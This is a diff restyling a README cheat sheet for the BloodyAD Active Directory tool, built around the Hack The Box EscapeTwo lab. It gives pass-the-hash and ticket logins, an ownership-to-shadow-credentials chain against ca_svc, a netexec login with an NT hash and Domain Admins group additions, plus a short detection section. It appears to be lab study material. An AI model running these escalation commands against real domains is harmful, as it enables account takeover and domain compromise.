@@ -1,9 +1,39 @@
-> **Active Directory Privilege Escalation Framework**  
-> A powerful LDAP/SAMR-based toolkit for AD enumeration and exploitation
+<!-- CYBERPUNK HEADER -->
+<div align="center">
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗   ██╗     █████╗ ██████╗      ║
+║  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗     ║
+║  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║ ╚████╔╝     ███████║██║  ██║     ║
+║  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║  ╚██╔╝      ██╔══██║██║  ██║     ║
+║  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝   ██║       ██║  ██║██████╔╝     ║
+║  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═════╝      ║
+║                                                                              ║
+║          [ Active Directory Privilege Escalation Framework ]                 ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+<!-- BADGES -->
+![Tool](https://img.shields.io/badge/TOOL-BloodyAD-red?style=for-the-badge&logo=python&logoColor=white)
+![Active Directory](https://img.shields.io/badge/ACTIVE_DIRECTORY-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
+![Privilege Escalation](https://img.shields.io/badge/PRIV_ESC-FF6B6B?style=for-the-badge&logo=hackthebox&logoColor=white)
+
+[![Author](https://img.shields.io/badge/Author-0xNetrunner-00FF00?style=flat-square&logo=github)](https://github.com/00xNetrunner)
+![Category](https://img.shields.io/badge/Category-AD_Exploitation-purple?style=flat-square)
+![Protocol](https://img.shields.io/badge/Protocol-LDAP%2FSAMR-blue?style=flat-square)
+
+</div>
 
 ---
 
-## 📋 Table of Contents
+> **`[SYSTEM]`** A powerful LDAP/SAMR-based toolkit for AD enumeration and exploitation
+>
+> **`[STATUS]`** Module: `LOADED` | Target: `DOMAIN_CONTROLLER` | Protocol: `LDAP`
+
+---
+
+## 📋 >_ Table.Of.Contents()
 
 - [Overview](#-overview)
 - [Installation](#-installation)
@@ -20,21 +50,31 @@
 
 ## 🎯 Overview
 
+```
+> Loading module: BloodyAD.dll...
+> Initializing LDAP connection handler...
+> Status: READY
+```
+
 **BloodyAD** is an Active Directory privilege escalation framework that performs LDAP/SAMR calls to domain controllers. It's particularly useful for:
 
-- 🔍 **Enumeration**: Query AD objects, attributes, and permissions
-- 🔐 **Privilege Escalation**: Exploit weak ACLs and permissions
-- 🎭 **Credential Operations**: Password changes, shadow credentials
-- 🔧 **Object Manipulation**: Modify user/computer/group attributes
-- 🌐 **Multi-Domain Operations**: Cross-domain enumeration and attacks
+| Function | Description | Icon |
+|:---------|:------------|:----:|
+| **Enumeration** | Query AD objects, attributes, and permissions | 🔍 |
+| **Privilege Escalation** | Exploit weak ACLs and permissions | 🔐 |
+| **Credential Operations** | Password changes, shadow credentials | 🎭 |
+| **Object Manipulation** | Modify user/computer/group attributes | 🔧 |
+| **Multi-Domain Operations** | Cross-domain enumeration and attacks | 🌐 |
 
-### Key Features
+### ⚡ Key Features
 
-✅ Multiple authentication methods (password, hash, ticket, certificate)  
-✅ LDAP/LDAPS/SAMR protocol support  
-✅ SOCKS proxy compatibility  
-✅ Cross-platform (Linux, macOS, Windows)  
-✅ No LDAPS required for sensitive operations  
+```
+[✓] Multiple authentication methods (password, hash, ticket, certificate)
+[✓] LDAP/LDAPS/SAMR protocol support
+[✓] SOCKS proxy compatibility
+[✓] Cross-platform (Linux, macOS, Windows)
+[✓] No LDAPS required for sensitive operations
+```
 
 ---
 
@@ -52,34 +92,34 @@ pip install --break-system-packages .
 bloodyAD --help
 ```
 
-> ⚠️ **Note**: On Kali Linux, BloodyAD is pre-installed and can be run directly.
+> ⚠️ **`[NOTE]`** On Kali Linux, BloodyAD is pre-installed and can be run directly.
 
 ---
 
 ## 🔑 Authentication Methods
 
-### Cleartext Password
+### 🔓 Cleartext Password
 ```bash
 bloodyAD --host <DC_IP> -d <domain> -u <username> -p '<password>' <command>
 ```
 
-### Pass-the-Hash
+### 🔐 Pass-the-Hash
 ```bash
 bloodyAD --host <DC_IP> -d <domain> -u <username> -p ':<NTLM_hash>' <command>
 ```
 
-### Pass-the-Ticket (Kerberos)
+### 🎫 Pass-the-Ticket (Kerberos)
 ```bash
 export KRB5CCNAME=/path/to/ticket.ccache
 bloodyAD --host <DC_FQDN> -d <domain> -u <username> -k <command>
 ```
 
-### Certificate Authentication
+### 📜 Certificate Authentication
 ```bash
 bloodyAD --host <DC_IP> -d <domain> -u <username> -c '/path/to/key:/path/to/cert' <command>
 ```
 
-### LDAPS (Secure LDAP)
+### 🛡️ LDAPS (Secure LDAP)
 ```bash
 bloodyAD --host <DC_IP> -d <domain> -u <username> -p '<password>' -s <command>
 ```
@@ -89,13 +129,15 @@ bloodyAD --host <DC_IP> -d <domain> -u <username> -p '<password>' -s <command>
 ## 📝 Command Structure
 
 ```
-bloodyAD [connection_options] [command] [subcommand] [arguments]
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  bloodyAD [connection_options] [command] [subcommand] [arguments]           │
+└─────────────────────────────────────────────────────────────────────────────┘
 ```
 
 ### Connection Options
 
 | Flag | Description | Example |
-|------|-------------|---------|
+|:-----|:------------|:--------|
 | `--host` | DC hostname or IP | `--host 10.10.11.51` |
 | `-d` | Domain name | `-d sequel.htb` |
 | `-u` | Username | `-u ryan` |
@@ -242,7 +284,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' set owner ca_svc
 bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' add genericAll ca_svc ryan
 ```
 
-> 💡 **Use Case**: HTB EscapeTwo uses this exact technique to compromise the `ca_svc` account!
+> 💡 **`[USE_CASE]`** HTB EscapeTwo uses this exact technique to compromise the `ca_svc` account!
 
 ### 2️⃣ GenericAll → Various Attack Paths
 
@@ -404,7 +446,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### Main Commands
 
 | Command | Description |
-|---------|-------------|
+|:--------|:------------|
 | `get` | Retrieve information from AD |
 | `set` | Modify attributes/settings |
 | `add` | Add permissions, users, objects |
@@ -413,7 +455,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### GET Subcommands
 
 | Subcommand | Description | Example |
-|------------|-------------|---------|
+|:-----------|:------------|:--------|
 | `object` | Get object attributes | `get object ryan --attr memberOf` |
 | `children` | List child objects | `get children 'DC=sequel,DC=htb' --type user` |
 | `search` | LDAP search query | `get search --filter '(objectClass=user)'` |
@@ -424,7 +466,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### SET Subcommands
 
 | Subcommand | Description | Example |
-|------------|-------------|---------|
+|:-----------|:------------|:--------|
 | `password` | Change user password | `set password ryan 'NewPass123!'` |
 | `owner` | Change object owner | `set owner ca_svc ryan` |
 | `object` | Modify object attribute | `set object ryan description -v "Admin User"` |
@@ -433,7 +475,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### ADD Subcommands
 
 | Subcommand | Description | Example |
-|------------|-------------|---------|
+|:-----------|:------------|:--------|
 | `genericAll` | Grant full control | `add genericAll target_object trustee` |
 | `groupMember` | Add user to group | `add groupMember 'Domain Admins' ryan` |
 | `shadowCredentials` | Add Key Credentials | `add shadowCredentials target_user` |
@@ -447,7 +489,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### REMOVE Subcommands
 
 | Subcommand | Description | Example |
-|------------|-------------|---------|
+|:-----------|:------------|:--------|
 | `genericAll` | Remove full control | `remove genericAll target trustee` |
 | `groupMember` | Remove from group | `remove groupMember 'Domain Admins' ryan` |
 | `shadowCredentials` | Remove Key Credentials | `remove shadowCredentials target` |
@@ -460,7 +502,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### UserAccountControl (UAC) Flags
 
 | Flag | Description | Add/Remove |
-|------|-------------|------------|
+|:-----|:------------|:-----------|
 | `ACCOUNTDISABLE` | Account is disabled | Enable: `remove`, Disable: `add` |
 | `DONT_REQ_PREAUTH` | No Kerberos pre-auth (ASREPRoast) | `add` or `remove` |
 | `DONT_EXPIRE_PASSWD` | Password never expires | `add` or `remove` |
@@ -473,7 +515,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### Common Attributes
 
 | Attribute | Description | Example Usage |
-|-----------|-------------|---------------|
+|:----------|:------------|:--------------|
 | `memberOf` | Group memberships | `get object ryan --attr memberOf` |
 | `userAccountControl` | UAC flags | `get object ryan --attr userAccountControl` |
 | `servicePrincipalName` | Service Principal Names | `set object user servicePrincipalName -v 'HTTP/web'` |
@@ -488,7 +530,7 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ### Additional Options
 
 | Option | Description |
-|--------|-------------|
+|:-------|:------------|
 | `--attr` | Specify attribute(s) to retrieve |
 | `--type` | Filter by object type (user/computer/group) |
 | `--resolve-sd` | Resolve security descriptors |
@@ -502,7 +544,12 @@ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Pass123!' get dnsDump
 ## 🏆 HTB EscapeTwo Workflow
 
 ### Context
-In HTB EscapeTwo, the user `ryan` has `WriteOwner` permission on the `ca_svc` service account. The goal is to escalate privileges by taking ownership and adding shadow credentials.
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  [SCENARIO] User 'ryan' has WriteOwner permission on 'ca_svc'               │
+│  [OBJECTIVE] Escalate privileges via ownership + shadow credentials         │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
 
 ### Step-by-Step Exploitation
 
@@ -531,10 +578,12 @@ netexec smb 10.10.11.51 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 
 ### Why This Works
 
-1. **WriteOwner** → Allows changing the object owner
-2. **Owner Rights** → Object owner can modify the object's DACL
-3. **GenericAll** → Full control enables shadow credentials attack
-4. **Shadow Credentials** → Retrieves NT hash without password change
+```
+[1] WriteOwner      →  Allows changing the object owner
+[2] Owner Rights    →  Object owner can modify the object's DACL
+[3] GenericAll      →  Full control enables shadow credentials attack
+[4] Shadow Creds    →  Retrieves NT hash without password change
+```
 
 ### Key Commands Breakdown
 
@@ -558,35 +607,23 @@ bloodyAD [auth] add genericAll <target> <trustee>
 
 ### ✅ Best Use Cases
 
-1. **WriteOwner/Owns Permission**
-   - Change object ownership
-   - Escalate to full control
-
-2. **GenericAll/GenericWrite Permission**
-   - Modify object attributes
-   - Add shadow credentials
-   - Configure delegation
-
-3. **WriteDACL Permission**
-   - Grant yourself additional permissions
-   - Add DCSync rights
-
-4. **Complex Privilege Escalation Paths**
-   - Multi-step attacks requiring ACL manipulation
-   - BloodHound-identified attack paths
-
-5. **Enumeration Tasks**
-   - Query specific attributes
-   - Find writable objects
-   - Enumerate permissions
+| Use Case | Description |
+|:---------|:------------|
+| **WriteOwner/Owns Permission** | Change object ownership, escalate to full control |
+| **GenericAll/GenericWrite Permission** | Modify object attributes, add shadow credentials, configure delegation |
+| **WriteDACL Permission** | Grant yourself additional permissions, add DCSync rights |
+| **Complex Privilege Escalation Paths** | Multi-step attacks requiring ACL manipulation |
+| **Enumeration Tasks** | Query specific attributes, find writable objects, enumerate permissions |
 
 ### ⚠️ Alternatives to Consider
 
-- **Certipy**: Dedicated shadow credentials tool (simpler for this specific attack)
-- **PowerView**: Windows-native AD enumeration
-- **Impacket suite**: Specific attack scripts (secretsdump, getST, etc.)
-- **ldapsearch**: Basic LDAP queries
-- **NetExec/CrackMapExec**: Broader AD enumeration and exploitation
+| Tool | Use Case |
+|:-----|:---------|
+| **Certipy** | Dedicated shadow credentials tool (simpler for this specific attack) |
+| **PowerView** | Windows-native AD enumeration |
+| **Impacket suite** | Specific attack scripts (secretsdump, getST, etc.) |
+| **ldapsearch** | Basic LDAP queries |
+| **NetExec/CrackMapExec** | Broader AD enumeration and exploitation |
 
 ---
 
@@ -594,11 +631,13 @@ bloodyAD [auth] add genericAll <target> <trustee>
 
 ### Detection Opportunities
 
-- Monitor for ownership changes on sensitive accounts
-- Alert on GenericAll/WriteDACL modifications
-- Track shadow credential additions (Key Credentials)
-- Log UAC flag changes
-- Monitor SPN modifications
+```
+[!] Monitor for ownership changes on sensitive accounts
+[!] Alert on GenericAll/WriteDACL modifications
+[!] Track shadow credential additions (Key Credentials)
+[!] Log UAC flag changes
+[!] Monitor SPN modifications
+```
 
 ### Best Practices
 
@@ -612,22 +651,54 @@ bloodyAD [auth] add genericAll <target> <trustee>
 
 ## 📚 Additional Resources
 
-- [Official Wiki](https://github.com/CravateRouge/bloodyAD/wiki)
-- [HTB EscapeTwo Writeup by 0xdf](https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html)
-- [Access Control Documentation](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control)
-- [Autobloody for BloodHound Integration](https://github.com/CravateRouge/autobloody)
+| Resource | URL |
+|:---------|:----|
+| 🔗 Official Wiki | https://github.com/CravateRouge/bloodyAD/wiki |
+| 📄 Access Control Docs | https://github.com/CravateRouge/bloodyAD/wiki/Access-Control |
+| 🤖 Autobloody | https://github.com/CravateRouge/autobloody |
 
 ---
 
 ## 💡 Pro Tips
 
-1. **Always enumerate first**: Use `get object --resolve-sd` to understand current permissions
-2. **Test in lab environments**: Practice complex attack chains before production
-3. **Clean up after yourself**: Remove shadow credentials and restore UAC flags
-4. **Combine with BloodHound**: Use autobloody for automated exploitation
-5. **Use LDAPS when possible**: Add `-s` flag for encrypted communications
-6. **Keep detailed notes**: Track ownership changes and permission modifications
+```
+[1] Always enumerate first: Use 'get object --resolve-sd' to understand current permissions
+[2] Test in lab environments: Practice complex attack chains before production
+[3] Clean up after yourself: Remove shadow credentials and restore UAC flags
+[4] Combine with BloodHound: Use autobloody for automated exploitation
+[5] Use LDAPS when possible: Add '-s' flag for encrypted communications
+[6] Keep detailed notes: Track ownership changes and permission modifications
+```
 
 ---
 
-**Created for HTB: EscapeTwo Lab** | **Tool Version: Latest** | **Happy Hacking! 🚀**
+<div align="center">
+
+## 👤 >_ Author.Info()
+
+```
+╔══════════════════════════════════════════════════════════════╗
+║                     [ NETRUNNER PROFILE ]                    ║
+╠══════════════════════════════════════════════════════════════╣
+║  HANDLE      :  0xNetrunner                                  ║
+║  CLASS       :  4th Year Ethical Hacking Student             ║
+║  SPECIALTY   :  Active Directory | Penetration Testing       ║
+║  STATUS      :  Active                                       ║
+╚══════════════════════════════════════════════════════════════╝
+```
+
+[![GitHub](https://img.shields.io/badge/GitHub-0xNetrunner-181717?style=for-the-badge&logo=github)](https://github.com/00xNetrunner)
+
+---
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║                  [ END OF TRANSMISSION ]                      ║
+║                    HACK THE PLANET! 🌐                        ║
+╚═══════════════════════════════════════════════════════════════╝
+```
+
+![BloodyAD](https://img.shields.io/badge/TOOL-BloodyAD-red?style=flat-square)
+![AD Exploitation](https://img.shields.io/badge/AD-EXPLOITATION-blue?style=flat-square)
+
+</div>
